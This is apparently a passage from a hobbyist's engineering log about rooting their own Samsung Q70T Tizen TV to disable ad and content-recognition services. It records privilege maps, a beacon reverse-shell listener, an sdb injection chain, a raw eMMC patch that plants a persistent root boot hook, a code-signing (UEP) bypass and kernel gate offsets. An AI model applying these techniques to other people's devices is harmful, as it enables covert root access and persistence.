`references/samsung-tv-tizen-root` repo ships the proven alternative
(field-verified on same-platform 21_NIKEL/Tizen 6.0, tiz0wn issue #5):

- `tools/tv-root-run.py` — sdb injection → `tar --to-command` archive-root →
  authenticated **uid 0** agent, no USB stick needed, ~10 s after boot.
- `tools/tv-rootwatch.sh` — host-side watchdog: detects TV reboot via the
  sdb port, re-arms root, re-applies the /run debloat masks automatically.

Next session: clone chris-ritsen/samsung-tv-root, build the .NET payloads
(SDK 6.0.428 present), adapt TV=<TV_IP> / HOST=<HOST_IP> / runtime
preflight (readlink, per issue #5), verify uid 0 on the Q70T, then install
the watchdog as a host LaunchAgent. The USB stick becomes a fallback.

### 18.4 Listener architecture that works

`tvroot-app/tvshell_server.py` — persistent Python TCP server on :4444,
accepts every beacon connection, logs to `out/tvshell-server.log`, driven by
writing commands to `/tmp/tvshell-cmd.txt`. The fifo/one-shot-nc relay is
deprecated (connection dropped mid-session twice). Root confirmed through it
once (`uid=0(root) … context="_"`) before a relay switch orphaned the session.

## 19. ENDGAME: the caps map + the partner-certificate path (2026-10-22, ~02:00)

### 19.1 Full file-capability inventory (the privilege map)

| binary | caps |
|---|---|
| `devzone-launcher` | setgid,setuid,setpcap,sys_chroot,sys_ptrace,**sys_admin**,mac_override,mac_admin+eip |
| `dotnet-launcher{,-inhouse}` | setgid,setuid,setpcap,sys_chroot,sys_ptrace,**sys_admin**,mac_override,mac_admin+eip |
| `launchpad-loader` / `-starter` / `-process-pool` | **sys_admin** variants |
| `dotnet-hydra-launcher` | setgid,**sys_admin**+ei |
| `amd` | dac_override,kill,**sys_admin**+ei |
| `wrt` | setgid,**sys_admin**,mac_override,mac_admin+ei |
| `sdbd` | dac_override,setgid,setuid,**sys_admin**+ei |
| `sdbd-tarlauncher` | setgid,setuid+eip |
| `pkgmgr-server` | chown,dac,fsetid,kill,setgid,**setuid**+ei |
| `kmod` | **sys_module**+ei — but `insmod` = EPERM (SMACK: module load needs the `_` label, not System) |

### 19.2 Managed-code caps: definitive

EVERY managed-code path runs **CapEff=0x0** (measured from inside the assembly,
three ways: launchpad app launch, launcher `--standalone` raw injection, both
launchers). The launcher's "EnterSecureZone/AttachZone(dotnetzone)" scrubs
caps before `coreclr_execute_assembly`. The bind-mount dance cannot run from
managed code as things stand.

The raw `--standalone` injection also fails `checkAppHasPlatformPrivilege`
(`GetLaunchedAppPackageID` EMPTY → `package_info_create` error -18153359):
the launcher demands an AUL app context the injection doesn't provide.

### 19.3 The partner-certificate path (next session's main line)

Every wall is certificate-level gated:
- `checkAppHasPlatformPrivilege` — cert level
- the launchpad cap-strip policy — likely cert level
- A **Samsung-signed partner certificate** (free: Tizen Studio Certificate
  Manager + Samsung account + the TV's DUID, auto-pulled for connected
  devices) may flip all of them.

Plan: create the Samsung cert in Tizen Studio → update the `q70t` profile's
distributor cert → reinstall tvroot3 → re-check `/proc/<pid>/status CapEff`
on launch (v0.4.0 already reports it to `/tmp/tvroot-caps.txt`). If
sys_admin appears: the app performs the ArchiveRoot dance itself (v0.4.0
code is already written) → root on every `aul_test launch`, watchdog-able.

### 19.4 berteotti/custom-tv intel (TU50DU7105, 2024)

- Vendored samsung-tv-root with a runtime-detection patch — same pattern we
  implemented (readlink + libcoreclr check). Their TV HAS `/usr/bin/dotnet`
  (custom host) — the Q70T has none; the patch does not transfer.
- Their level-3 debloat = our exact mechanism: 10 runtime `/run` masks +
  `ConditionPathExists` markers (pisa, canalysis) + `pkgcmd -D --uid 5001`
  app disables (works on Tizen 8; issue #5 says -D is absent on Tizen 6).
- Supervisor note: targeted-ads + Samsung Health restart despite disable →
  `kill -STOP` per boot.
- Home-button retarget via uid-5001 + Samsung's app-operation API
  (home-routing) — potential Free-My-TV-as-Home upgrade once root lands.

### 19.5 The forged-app-context breakthrough + the final wall (measured)

`export APP_ID=org.tvroot3.q70t` (+ variants) before the launcher exec:
- **`GetLaunchedAppPackageID` → `org.tvroot3.q70t`** — the app context forges!
- `zone-security-manager` classifies the launcher **[PLATFORM]** (partner cert!)
- The plain launcher reaches **`execute assembly`** — our C# runs in-process
- **BUT: `CapEff=0x0` still** (measured with a fresh-named report file — the
  earlier reports were uid-blocked: 901 can't write 5001-owned /tmp files)
- The inhouse launcher's appid lookup reads a DIFFERENT key (env shotgun
  didn't reach it) — untested with a working app context

Conclusion: the launcher drops caps UNCONDITIONALLY before
`coreclr_execute_assembly`, via `libsecurity-privilege-manager.so.1` +
the dotnetzone attach (libzone.so.5; zone-security-manager is live on this
TV — fanotify [PLATFORM] classification observed).

**The last lever:** pull `libsecurity-privilege-manager.so.1` +
`libzone.so.5` (capture-base64, same as the launcher) and analyze the drop
path offline: is it conditional (env/config/zone-config in /opt)? The
unstripped launcher disassembly is in tvroot-app/dotnet-launcher-inhouse.bin
(symbols intact; /tmp/launcher.asm from arm-none-eabi-objdump).

Also open: `dotnet-hydra-launcher` (sys_admin, 10 KB, CLI unknown — silent
with --standalone), `devzone-launcher` (full caps; execv's arbitrary binaries
under sdk_tools after zone_attach_process("devzone") — the devzone grant is
unanalysed), `wrt` (sys_admin), `amd` (sys_admin; no CLI help).

## 20. PERSISTENT BOOT HOOK — profile.d raw-block technique (2026-10-22)

Mission: make the debloat survive reboots **without the USB stick**, via the
metaljay Q90T technique (in-place edit of one block of a root-sourced
profile.d script on the raw eMMC device). Everything below was measured on
this TV; the live write is staged and one command away.

### 20.1 Rootfs identification (MSDU11 → eMMC)

| MSDU11 section | partition | notes |
|---|---|---|
| 8 `platform.img` (0x637ed010 B = 1.67 GB, salt `11abbc9067638bc4`) | `/dev/mmcblk0p19` (1,751,040 KiB) | **the system rootfs**, Samsung **vdfs**, mounted `ro` on `/` (`root=/dev/mmcblk0p19 rootfstype=vdfs`); p18 = the A/B sibling (untouched) |
| 3 `uImage` | p5/p6 (kernel A/B) | decrypted 2026-10-21, address table |
| 6/7 `secos*.bin` | TEE | — |

A full local extraction of platform.img was **deliberately skipped**: it needs
the 1.67 GB ciphertext pushed over sdb (~50 min) plus 1.67 GB of scratch space
(/opt has 657 MB free), and there are no vdfs tools for macOS anyway. The
*installed* plaintext already lives on the TV at `/dev/mmcblk0p19`, and the
target file is a plain shell script — so the authoritative source of truth is
the live device, which is also what the boot actually reads. What WAS pulled
offline: every `/etc/profile.d/*` script (13 files, byte-exact via `base64`
over the sdk foothold), `/etc/profile`, and the unit file.

### 20.2 The chain, measured on this TV

```
tizen-system-env.service   (enabled; WantedBy=basic.target;
                            DefaultDependencies=no; Before=basic.target;
                            Type=oneshot; RemainAfterExit=yes)
  ExecStart=/usr/bin/env -i sh -c 'source /etc/profile; env | egrep -v ... '
  Active: active (exited) since 1969-12-31 19:00:02  -> boot + 2 s
  -> /etc/profile  ->  for i in /etc/profile.d/*.sh -> . "$i"
     -> /etc/profile.d/bash_prompt_custom.sh   (776 B, root)
```

`bash_prompt_custom.sh` is **byte-identical to the Q90T vendor script**
(776 B, sha256 `effe97f8ec948a15962fc8a1b85a4e1e446352b8c5caae703e1ed0684425e33c`)
and is pure prompt/alias sugar inside `if [ "$PS1" ]` — it does nothing during
the boot source (no PS1), so replacing its body cannot change boot behaviour.

Also confirmed: `/home/owner -> /opt/usr/home/owner` (p21, persistent), so
payloads staged in `sdk_tools` survive reboots.

### 20.3 The patch (776 bytes in → 776 bytes out)

`tvroot-app/persistent-hook/patched-script.sh` — exactly **776 bytes**
(sha256 `ca30fa2bb89596b7e5db45185bb265487165072745a5455d7c0d2138de9d3154`):
* the vendor prompt/alias logic, minified but behaviour-equivalent, still
  guarded by `if [ "$PS1" ]`;
* a boot hook, POSIX-sh safe, absolute paths only (`env -i` strips PATH):
  takes the once-per-boot marker `/run/.tvroot-hook` **synchronously** (race
  found and fixed in simulation: three immediate sources produced three
  firings with the async-marker variant), then backgrounds a bounded waiter
  (≤120 s) for `/opt/usr/share/tvroot/boot.sh` — /opt may not be mounted yet
  at boot+2 s;
* padded with a comment to exactly 776 bytes.

`boot.sh` = once-per-boot guard (`/run/.tvroot-debloat`) + runs `debloat.sh`
(the `/run/systemd/system` `/dev/null` masks for `acr.service`, `acr.path`,
`contents-recognition-service.service`, `vision-data-recognition-service.service`,
`vdsystem-update-manager.service`, `org.tizen.remotepc.service` +
`daemon-reload` + 25 s delayed `systemctl --no-block stop` pass + census),
all best-effort, logged to `/opt/usr/share/tvroot/debloat.log`.

### 20.4 Locating the block: marker grep, not filesystem math

vdfs has no tools, so `apply-persistent-hook.sh` (run as root) greps the raw
device for `alias lr="ls -ltrZ"` (offset 629 in the script), subtracts 629 for
the file start, and accepts a candidate **only if the 776 bytes there hash to
the vendor original**. Consequences:
* every candidate is a byte-identical copy of the same script, so patching it
  is size- and semantics-safe;
* if the FS still serves the old bytes after `drop_caches`, the candidate was
  a stale copy → it is restored from its own backup and the next hit is tried;
* the write is read-modify-write of the containing 512-byte blocks: bytes
  outside the patched region are hashed before/after and proven unchanged
  (the file may share its last block with the next file).

Simulation (4 MB fake device, file at unaligned offset 2697 = block 5 +137, a
decoy marker, and a two-identical-copies variant): locate → backup → overlay →
write → readback → rollback, all byte-exact. Behaviour simulation: sourcing
the patched script three times in a row fires the hook **once**; with /opt
missing the waiter times out silently; dash and bash both OK.

### 20.5 Staged state (ready for the live write)

```
/home/owner/share/tmp/sdk_tools/hook.tar   (24 576 B,
 sha256 dfb7ef9e399c2bf2ee4341ec0ff877333efc1c32142f3edabbf7de51a167b5c5)
  = hook-patched.bin + tvroot-boot.sh + tvroot-debloat.sh + apply-hook.sh
tvshell_server.py running on :4444 (beacon listener)
```

**The exploit stick is not inserted** (`/opt/media` empty, no `/dev/sd*`), so
the live write waits for it:

```
# owner: insert the USB stick (or reboot with it in)
python3 tvroot-app/persistent-hook/tvrun.py wait 120        # beacon lands
python3 tvroot-app/persistent-hook/tvrun.py send \
  'tar -xf /home/owner/share/tmp/sdk_tools/hook.tar -C /tmp && sh /tmp/apply-hook.sh'
python3 tvroot-app/persistent-hook/tvrun.py send \
  'tail -20 /opt/usr/share/tvroot/debloat.log; sha256sum /etc/profile.d/bash_prompt_custom.sh'
```

Rollback: `sh /opt/usr/share/tvroot/backup/rollback.sh` (generated by the
apply script with the live block numbers; the backup is the byte-exact
pre-write image of every touched block).

### 20.6 Notes / limits

* Only the **active** rootfs p19 is patched; the A/B sibling p18 is not — if
  the TV ever boots from p18 the hook is absent (documented, intentional).
* The debloat masks land **before basic.target** (the hook fires at boot+2 s),
  i.e. before the ACR trio starts — strictly better than the stage1 timing.
* `sdb` wedges after a few operations per boot: everything needed on the TV
  was staged with 6 sdb operations; the live step needs **zero** further sdb.
* Alternative no-surgery path investigated: `AT-HUB.service` exists here
  (`starter.target.wants`) and references `parseinfo` (the upstream stage-2
  anchor) — not used because the profile.d hook fires earlier (before
  basic.target) and is already validated on the same platform.

### 19.6 Tizen-9 corroboration (abhiigatty, UA55UE84AFULXL, published 2026-10-21)

An independent Tizen-9 modder with the same samsung-tv-root base hit the same
walls and chose the same architecture:

- **Volatile /run masks + a host maintenance helper** that re-applies after
  every boot (polls ~8 s, waits 15 s post-reconnect, re-verifies a fixed
  allowlist). "I kept that limitation instead of remounting or modifying
  firmware partitions."
- **`pkgcmd -D` disable flags REVERTED themselves** (29/45) — the helper
  re-applies them by allowlist. Supervisor-respawning services (targeted-ads,
  Samsung Health) handled with per-boot `kill -STOP`.
- Marker inventory (Tizen 9): pisa-service, canalysis-daemon,
  context-aware-agent/service, AICompanionAgent, ghdaemon, bixby-prov,
  ondevice-voice. Runtime-masked: media-analytics, ambient-ua-agent,
  **pisa-service.socket** (check on our fw), voiceassistant-music,
  reminder-service, sp-kpi.
- Root-channel adaptations that transfer to our injection: capture timeout
  budget `max(accept+20, command_timeout*(commands+1))`; **`exec 3>&-` in
  backgrounded commands** (a deferred reboot held the callback socket open);
  staged scripts delivered via `cat | bash`.
- Their Home-button rerouting (Tizen 9 API) = a candidate Free-My-TV upgrade
  post-root: `aul_svc_set_operation` + `app_operation_set_current_app` +
  `db/appfw/home_appid` via a uid-5001 native helper.

### 19.7 The delivery lesson (the last operational bug)

The persistent-hook chain kept "failing" for a cascade of reasons, the final
one being: an interactive-beacon `sh -n` zombie blocked every subsequent
command in its session, and the beacon connection itself died — invisible
because the report files were uid-blocked (901 vs 5001-owned /tmp files).
Fixes now proven:
- deliver scripts via **base64 in ~540-char appends** through the beacon
  (the 2900-char one-liner gets mangled by readline);
- fire with a **SHORT nohup command in a FRESH session** — never behind
  earlier commands in a long-lived beacon;
- verify through the **SDK channel with kill-server recovery**, not the
  beacon (different failure domains);
- the hook-run script writes its own log FIRST (`exec > /tmp/hook-run.log`)
  and the locate/patch state to fresh-named files.

Current on-TV state: /tmp/hook-run.sh staged (2000 B, syntax-OK), waiting
for a fresh boot + one short fire command. /tmp clears at boot → re-deliver
the script via the 5-part base64 appends after the reboot, then fire.

### 19.8 The final automation state (2026-10-23 morning)

- `hook-run.sh` staged PERSISTENTLY at
  `/home/owner/share/tmp/sdk_tools/hook-run.sh` (2000 B, syntax-verified,
  survives reboots; sdb push = one op, no injection needed).
- `fire-stage.sh` watcher (host): waits for the next beacon connection,
  then fires the staged hook-run with ONE 80-char command through the
  beacon root shell. Single instance confirmed.
- The delivery lessons that unblocked everything: base64 in ≤60-char
  appends (readline truncates longer lines at ~64 through the socket),
  per-append verification, and the fire as a SHORT command in a FRESH
  session (the zombie `sh -n` class blocked whole command chains).
- The keepalive beacon (15 s `:` no-ops) keeps the socket warm, but the
  TV→Mac output direction still dies after ~30-60 min — the hook-run's
  nohup design makes the beacon's fate irrelevant after the fire.
- Remaining verification: after the next beacon + fire + ~25-40 min,
  the on-device script hash = ca30fa2b… (patched) and
  /opt/usr/share/tvroot/debloat.log exists (the boot hook ran).

## 21. SOLVED — the TV now debloats itself at boot+0.74 s (2026-10-24)

```
=== tvroot boot entry uptime=0.74s uid=0 ctx=_
--- masks installed at uptime=0s
--- delayed stop pass done at uptime=31s
--- census:
      acr: inactive
      contents-recognition-service: inactive
      vision-data-recognition-service: inactive
      vdsystem-update-manager: inactive
      org.tizen.remotepc: deactivating
```

Verified with the **USB stick removed** and no host involvement:
`/run/.tvroot-hook` and `/run/.tvroot-debloat` (tmpfs guards, wiped each boot)
both existed; debloat.log was written ~21 s after power-on; 6 masks present.

### The unlock: UEP hooks script *file loading*, so don't exec the file

`[uep][bash] the file is NOT signed!!` blocked every `sh /path/script.sh`.
txtsamu's NT72172 writeup supplied the bypass: **content as argument**.

```sh
sh -c "$(cat /opt/usr/share/tvroot/boot.sh)"    # no execve → no UEP check
```

Both links now use it: the patched profile.d hook runs `boot.sh` by content,
and `boot.sh` runs `debloat.sh` by content.

### Final on-device state

```
p19 block 3150336 (byte 1612972032), 776 bytes
vendor   effe97f8ec948a15962fc8a1b85a4e1e446352b8c5caae703e1ed0684425e33c
v1       ca30fa2bb89596b7e5db45185bb265487165072745a5455d7c0d2138de9d3154  (exec — blocked)
v2       6c5a2ceb62586047…  (current, UEP-safe in both links)
backup   /opt/usr/share/tvroot/backup/rootfs-p19-blk3150336-2.bin  (7d0f116e…)
rollback sh /opt/usr/share/tvroot/backup/rollback.sh
boot     /opt/usr/share/tvroot/boot.sh → debloat.sh
```

Note: the write needed `echo 3 > /proc/sys/vm/drop_caches` before the
filesystem-facing `sha256sum` reflected the new block content (vdfs page cache).

Full public narrative: [WRITEUP.md](WRITEUP.md).

## 22. Remaining findings, consolidated (2026-10-24)

### 22.1 The archive-root / launcher campaign (negative results, fully mapped)

Goal was root **without** the USB stick, via the upstream archive-root chain.
Everything below was measured on the device.

| Attempt | Result |
|---|---|
| Upstream `samsung_tv_root` payloads (net6.0) | no `/usr/bin/dotnet` on this firmware |
| netcoreapp3.1 payload build | runtime on TV is **3.0.0** only (2.0.0/2.1.x/3.0.0) |
| netcoreapp3.0 payload build + staged run | launcher found, but `.dll` never executed |
| `/usr/bin/dotnet-launcher --standalone <dll>` from the injection | `execute assembly` reached, assembly runs, **CapEff=0x0** |
| Same with `APP_ID=<installed app id>` forged | `GetLaunchedAppPackageID` fills correctly, zone manager classifies `[PLATFORM]`, assembly runs — **still CapEff=0x0** |
| Same after installing a **Samsung partner certificate** (DUID-bound, `Certificate Manager`) | identical — the cap scrub is not certificate-gated |
| `dotnet-launcher-inhouse --standalone` with the forged id | inhouse plugin reads a different key; still no caps |

Conclusion: on this firmware the launcher's `EnterSecureZone/AttachZone(dotnetzone)`
**unconditionally** strips capabilities before `coreclr_execute_assembly`, via
`libsecurity-privilege-manager.so.1` + `libzone.so.5`. Managed code on the Q70T
can never carry `sys_admin`, so the bind-mount + `sdbd-tarlauncher` dance
(which is how the 2021+ sets get uid 0 over sdb) cannot run here.

Side findings worth keeping:

* The upstream `on-demand/` directory had **~30 unprocessed archives** from
  earlier runs — `sdbd-tarlauncher` does not watch that directory; something
  must invoke it explicitly.
* `APP_ID=<pkg>` (and `AUL_APPID`, per txtsamu) is what fills
  `GetLaunchedAppPackageID`; without it the launcher logs
  `package_info_create error -18153359` and refuses the platform path.
* The launcher will not run a DLL under `/opt`; the payload must live in an app
  directory under `/home/owner/share/tmp/…`.

### 22.2 Kernel module loading: closed by SMACK, not caps

`/usr/bin/kmod` carries `cap_sys_module+ei`, but `insmod` of a stock module
returns `EPERM` from the `System` label: Tizen requires the `_` label to load
modules. Since the only `_`-labelled root we ever get is the USB exploit's
`call_usermodehelper` child, module loading adds nothing over that primitve —
and the exploit already gives uid 0.

### 22.3 Managed-code capability map (measured, one place)

| path | CapEff | note |
|---|---|---|
| launchpad app launch (`aul_test launch`) | `0x0` | strip happens in the loader |
| `dotnet-launcher --standalone` from injection | `0x0` | zone attach scrubs |
| `dotnet-launcher-inhouse --standalone` | `0x0` | same |
| USB exploit `call_usermodehelper` child | full (uid 0, `_`) | the only full-capability path |

### 22.4 Trigger reliability: the macOS fsKit trap

The exFAT trigger's crafted entry is deliberately malformed. **macOS auto-mounts
the stick and its fsKit "repairs" the entry**, after which the TV mounts cleanly
and no exploit fires. Observed directly: boots after a fresh `dd` fired 4/4;
boots after the stick had been mounted on the Mac fired ~1/5.

Rules:

* flash → straight to the TV, never let the Mac mount it in between;
* arm the `:4444` listener **before** powering the TV on (a blocking
  `/dev/tcp` connect inside the mount can stall it into a watchdog reboot);
* keep the cave blob ≤ 547 bytes so `num_ext` stays 67.

### 22.5 Channel hygiene that made the last day possible

These cost hours; they are all cheap to avoid.

1. **Injection-spawned background processes die with the session.** `nohup`
   from the sdb injection does not survive. Root-shell (`call_usermodehelper`)
   children with `nohup` do.
2. **Interactive bash over the beacon truncates long pasted lines** at roughly
   the terminal width (~64 chars observed). Deliver files as base64 in ≤60-char
   appends and verify size per append.
3. **Dead sockets look alive.** The TV→Mac direction can die while Mac→TV keeps
   working; commands then execute invisibly. Verify with an independent channel
   (sdb), never trust "no output = no effect".
4. **A blocked `sh -n` becomes a D-state zombie** on a busy eMMC and silently
   queues every later command in that session. Kill it or start a new session.
5. **`/tmp` files are uid-sticky**: a file created by uid 901 cannot be deleted
   or appended by uid 5001. Use fresh names per attempt.
6. **tmpfs guard flags are the ground truth** for "did the boot hook run":
   `/run/.tvroot-hook` and `/run/.tvroot-debloat` cannot survive a reboot.
7. `systemctl stop` on this TV can hang indefinitely — use `--no-block`.
8. After a raw block write, `echo 3 > /proc/sys/vm/drop_caches` before trusting
   a filesystem-level hash (vdfs page cache).

### 22.5a Executable mappings are path-gated (closes the loader bypass)

Measured with `/bin/true` as the signed host:

- `LD_PRELOAD=/usr/lib/libvconf.so.0` → loads
- the same file copied to `/opt`, `/tmp`, `/dev/shm`, `sdk_tools` → `failed to
  map segment from shared object`
- an unsigned `.so` → same everywhere

No mount is `noexec`, so the gate is the path. `LD_PRELOAD`, `ld.so <file>` and
"signed binary copied to writable storage" are all closed. Managed code is
unaffected because CoreCLR maps assemblies as data.

### 22.5b The decrypted kernel is a uImage with a 64-byte header

`uImage-2743.bin` starts with `27 05 19 56` (u-boot magic), not ARM code.
Kernel file offset = **0x40 + (VA - 0xC0008000)**. With that shift, the three
UEP gate sites published by gtalusan match exactly:

```
0x1d614c / 0x1d627c / 0x1d6564 : 00 30 93 e5   (ldr r3,[r3])
s_uepStatus @0x68b46c          : 01 00 00 00
```

Without the shift they appear absent, which is exactly the false negative we hit
first. This also confirms the Q70T kernel and the published 2743.0 image are the
same build.

### 22.5c UEP down on the Q70T via loopback (verified 2026-10-26)

`nikem-uep2` (three gate stores, no entry trampoline) fired from
`/opt/usr/share/tvroot/uep2.img` through `losetup` + `mount -t exfat` +
`readdir`:

- proof: an unsigned static ARM binary printed `LD-OK` as uid 901, from both
  `/opt` and `/dev/shm`;
- then dropbear (unsigned) started and served **root SSH on :22** with an
  ed25519 host key in `/opt/etc/dropbear`;
- no panic, no reboot; the patch is RAM-only and re-applied per firing.

Two traps: the stage must be padded to keep `num_ext=67` (392 B stage → 544 B
cave), and dropbear's `-R` writes host keys to the read-only `/etc/dropbear` —
generate them in `/opt` and pass `-r`.

### 22.6 Open items / future work

* **Cold-boot root without the stick.** The profile.d hook runs as root at
  boot+0.74 s, so it could *also* re-arm root (e.g. copy a SUID helper to `/opt`
  or re-apply a UEP-off word) if UEP is bypassed for the payload. Not attempted:
  the debloat goal is met, and a root re-arm widens the attack surface.
* **UEP status word `0xc069342c`** (NIKEM): flipping it to 0 would allow
  unsigned native binaries for the session. Reported unstable on Q90T; not
  needed given the content-as-argument bypass.
* **`/run` masks vs vendor re-enable.** `pkgcmd -D` flags are known to revert
  after some firmware actions (Tizen 8/9 reports); the boot hook re-applies the
  masks regardless, so this is covered.
* **Persistence review.** The 776-byte patch is in-place and survives firmware
  *reboots*, not firmware *updates*: a system update rewrites `/etc` and the
  hook is gone (and must be re-derived at the new block offset).
